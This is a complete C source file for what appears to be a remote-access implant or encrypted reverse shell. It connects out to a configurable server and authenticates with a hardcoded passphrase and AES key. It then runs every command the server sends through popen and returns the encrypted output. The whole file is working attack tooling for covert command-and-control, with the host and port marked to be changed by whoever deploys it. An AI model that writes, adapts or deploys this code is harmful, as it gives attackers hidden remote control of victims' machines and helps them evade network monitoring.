#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/rand.h>
#include <cjson/cJSON.h>


#define CHECK_SERVER_MSG "CHECK_SERVER_MSG"
#define SERVER_IS_UP_MSG "SERVER_IS_UP_MSG"
#define CLIENT_INIT_CONN_KEY_MSG "CLIENT_INIT_CONN_KEY_MSG"
#define KEY_EXCHANGE_SUCCEEDED_MSG "KEY_EXCHANGE_SUCCEEDED_MSG"
#define KEY_EXCHANGE_FAILED_MSG "KEY_EXCHANGE_FAILED_MSG"

#define CHECK_SERVER_MSG_LEN (sizeof(CHECK_SERVER_MSG) - 1)
#define SERVER_IS_UP_MSG_LEN (sizeof(SERVER_IS_UP_MSG) - 1)
#define CLIENT_INIT_CONN_KEY_MSG_LEN (sizeof(CLIENT_INIT_CONN_KEY_MSG) - 1)
#define KEY_EXCHANGE_SUCCEEDED_MSG_LEN (sizeof(KEY_EXCHANGE_SUCCEEDED_MSG) - 1)

static const unsigned char COMMAND_COMMUNICATION_SECRET[32] = {
    0x9a, 0x7f, 0xee, 0xfd, 0x22, 0xba, 0x34, 0x55,
    0x01, 0xac, 0x88, 0xff, 0x02, 0xdd, 0x43, 0x91,
    0x9c, 0xba, 0xf4, 0x28, 0x76, 0x5e, 0xae, 0x0c,
    0xda, 0x77, 0x2f, 0x98, 0xab, 0x19, 0x34, 0xcc
};

const char *INIT_KEY = "TRUSTME";       //change accordingly
const char *SERVER_HOST = "127.0.0.1";   //here 
const int SERVER_PORT = 9999;       //and here too

void sha256_bytes(const char *data, unsigned char *hash) {
    SHA256_CTX ctx;
    SHA256_Init(&ctx);
    SHA256_Update(&ctx, data, strlen(data));
    SHA256_Final(hash, &ctx);
}

int recv_all(int sock, void *buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        ssize_t n = recv(sock, (char *)buf + total, len - total, 0);
        if (n <= 0) return 0; 
        total += n;
    }
    return 1;
}

size_t aes_gcm_encrypt(const unsigned char *plaintext, size_t plaintext_len, unsigned char **ciphertext) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return 0;

    *ciphertext = malloc(12 + plaintext_len + 16);
    if (!*ciphertext) {
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }


    if (RAND_bytes(*ciphertext, 12) != 1) {
        free(*ciphertext);
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    int outlen, final_len;
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1 ||
        EVP_EncryptInit_ex(ctx, NULL, NULL, COMMAND_COMMUNICATION_SECRET, *ciphertext) != 1) {
        free(*ciphertext);
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    if (EVP_EncryptUpdate(ctx, *ciphertext + 12, &outlen, plaintext, plaintext_len) != 1) {
        free(*ciphertext);
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    if (EVP_EncryptFinal_ex(ctx, *ciphertext + 12 + outlen, &final_len) != 1) {
        free(*ciphertext);
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, *ciphertext + 12 + plaintext_len) != 1) {
        free(*ciphertext);
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    EVP_CIPHER_CTX_free(ctx);
    return 12 + plaintext_len + 16;
}

size_t aes_gcm_decrypt(const unsigned char *ciphertext, size_t ciphertext_len, unsigned char **plaintext) {
    if (ciphertext_len < 28) return 0; 

    size_t ct_len = ciphertext_len - 28;
    *plaintext = malloc(ct_len + 1); 
    if (!*plaintext) return 0;

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        free(*plaintext);
        return 0;
    }

    int outlen, final_len;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1 ||
        EVP_DecryptInit_ex(ctx, NULL, NULL, COMMAND_COMMUNICATION_SECRET, ciphertext) != 1) {
        free(*plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    if (EVP_DecryptUpdate(ctx, *plaintext, &outlen, ciphertext + 12, ct_len) != 1) {
        free(*plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void *)(ciphertext + 12 + ct_len)) != 1) {
        free(*plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return 0;
    }

    int ret = EVP_DecryptFinal_ex(ctx, *plaintext + outlen, &final_len);
    EVP_CIPHER_CTX_free(ctx);

    if (ret <= 0) { 
        free(*plaintext);
        return 0;
    }

    (*plaintext)[outlen + final_len] = '\0'; 
    return outlen + final_len;
}

char *execute_command(const char *command) {
    FILE *fp = popen(command, "r");
    if (!fp) return strdup("Error: Failed to execute command");

    char buffer[4096];
    size_t output_size = 4096;
    char *output = malloc(output_size);
    if (!output) {
        pclose(fp);
        return strdup("Error: Memory allocation failed");
    }

    output[0] = '\0';
    while (fgets(buffer, sizeof(buffer), fp)) {
        size_t len = strlen(buffer);
        size_t current_len = strlen(output);
        if (current_len + len + 1 > output_size) {
            output_size *= 2;
            char *new_output = realloc(output, output_size);
            if (!new_output) {
                free(output);
                pclose(fp);
                return strdup("Error: Memory allocation failed");
            }
            output = new_output;
        }
        strcat(output, buffer);
    }

    pclose(fp);
    return output;
}

char *replace_crlf(const char *input) {
    const char *p = input;
    size_t new_len = 0;
    
    while (*p) {
        if (*p == '\r' && *(p + 1) == '\n') {
            new_len++;
            p += 2;
        } else {
            new_len++;
            p++;
        }
    }

    char *result = malloc(new_len + 1);
    if (!result) return NULL;

    char *q = result;
    p = input;
    while (*p) {
        if (*p == '\r' && *(p + 1) == '\n') {
            *q++ = '\n';
            p += 2;
        } else {
            *q++ = *p++;
        }
    }
    *q = '\0';
    return result;
}

int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[-] Socket error");
        exit(1);
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_HOST, &server_addr.sin_addr) <= 0) {
        perror("[-] Invalid address");
        close(sock);
        exit(1);
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr))) {
        perror("[-] Connection failed");
        close(sock);
        exit(1);
    }
    printf("[+] Connected to server\n");

    if (send(sock, CHECK_SERVER_MSG, CHECK_SERVER_MSG_LEN, 0) != CHECK_SERVER_MSG_LEN) {
        perror("[-] Send failed");
        close(sock);
        exit(1);
    }

    unsigned char buffer[SERVER_IS_UP_MSG_LEN];
    if (!recv_all(sock, buffer, SERVER_IS_UP_MSG_LEN)) {
        perror("[-] Receive failed");
        close(sock);
        exit(1);
    }

    if (memcmp(buffer, SERVER_IS_UP_MSG, SERVER_IS_UP_MSG_LEN) != 0) {
        fprintf(stderr, "[-] Server not responding correctly\n");
        close(sock);
        exit(1);
    }

    unsigned char key_hash[32];
    sha256_bytes(INIT_KEY, key_hash);

    unsigned char key_msg[CLIENT_INIT_CONN_KEY_MSG_LEN + 32];
    memcpy(key_msg, CLIENT_INIT_CONN_KEY_MSG, CLIENT_INIT_CONN_KEY_MSG_LEN);
    memcpy(key_msg + CLIENT_INIT_CONN_KEY_MSG_LEN, key_hash, 32);

    if (send(sock, key_msg, sizeof(key_msg), 0) != sizeof(key_msg)) {
        perror("[-] Key exchange failed");
        close(sock);
        exit(1);
    }

    if (!recv_all(sock, buffer, KEY_EXCHANGE_SUCCEEDED_MSG_LEN)) {
        perror("[-] Receive failed");
        close(sock);
        exit(1);
    }

    if (memcmp(buffer, KEY_EXCHANGE_SUCCEEDED_MSG, KEY_EXCHANGE_SUCCEEDED_MSG_LEN) != 0) {
        fprintf(stderr, "[-] Key exchange failed\n");
        close(sock);
        exit(1);
    }

    printf("[+] Handshake complete, waiting for commands...\n");

    while (1) {
        uint32_t cmd_len;
        if (!recv_all(sock, &cmd_len, sizeof(cmd_len))) {
            perror("[-] Receive failed");
            break;
        }
        cmd_len = ntohl(cmd_len);

        unsigned char *encrypted_cmd = malloc(cmd_len);
        if (!encrypted_cmd) {
            perror("[-] Memory allocation failed");
            break;
        }

        if (!recv_all(sock, encrypted_cmd, cmd_len)) {
            perror("[-] Receive failed");
            free(encrypted_cmd);
            break;
        }

        unsigned char *plaintext;
        size_t plaintext_len = aes_gcm_decrypt(encrypted_cmd, cmd_len, &plaintext);
        free(encrypted_cmd);
        if (!plaintext_len) {
            fprintf(stderr, "[-] Decryption failed\n");
            continue;
        }

        cJSON *cmd_json = cJSON_Parse((char *)plaintext);
        free(plaintext);
        if (!cmd_json) {
            fprintf(stderr, "[-] JSON parse error\n");
            continue;
        }

        cJSON *cmd_obj = cJSON_GetObjectItem(cmd_json, "command");
        if (!cmd_obj || !cJSON_IsString(cmd_obj)) {
            fprintf(stderr, "[-] Invalid command format\n");
            cJSON_Delete(cmd_json);
            continue;
        }

        const char *command = cmd_obj->valuestring;
        printf("[+] Received command: %s\n", command);
        cJSON_Delete(cmd_json);


        char *output = execute_command(command);
        char *normalized_output = replace_crlf(output);
        free(output);

        cJSON *response = cJSON_CreateObject();
        cJSON_AddStringToObject(response, "output", normalized_output);
        char *json_str = cJSON_PrintUnformatted(response);
        cJSON_Delete(response);
        free(normalized_output);


        unsigned char *encrypted_output;
        size_t encrypted_len = aes_gcm_encrypt((unsigned char *)json_str, strlen(json_str), &encrypted_output);
        free(json_str);
        if (!encrypted_len) {
            fprintf(stderr, "[-] Encryption failed\n");
            continue;
        }


        uint32_t net_len = htonl(encrypted_len);
        if (send(sock, &net_len, sizeof(net_len), 0) != sizeof(net_len)) {
            perror("[-] Send failed");
            free(encrypted_output);
            break;
        }

        

        if (send(sock, encrypted_output, encrypted_len, 0) != encrypted_len) {
            perror("[-] Send failed");
            free(encrypted_output);
            break;
        }
        free(encrypted_output);
    }

    close(sock);
    return 0;
}